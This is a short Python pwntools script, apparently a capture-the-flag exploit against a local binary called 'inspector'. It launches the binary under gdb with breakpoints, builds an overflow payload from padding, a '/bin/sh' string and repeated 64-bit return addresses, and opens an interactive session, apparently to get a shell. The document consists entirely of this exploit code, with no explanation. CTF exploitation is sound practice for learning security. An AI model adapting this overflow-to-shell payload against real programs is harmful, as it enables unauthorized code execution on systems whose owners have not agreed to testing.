#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

do_remote = False
binary_name = './inspector'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b*0x00400678
b*0x00400672
b main
'''



DATA = ''
DATA += ('AAAAAAAA')
DATA += ('/bin/sh ')
DATA += p64(0x00400621)
DATA += p64(0x00400621)
DATA += p64(0x00400621)
DATA += p64(0x00400621)
DATA += p64(0x00400621)





target = gdb.debug(binary_name, gdb_script)
print target.read()
print DATA
target.sendline(DATA)
target.interactive()

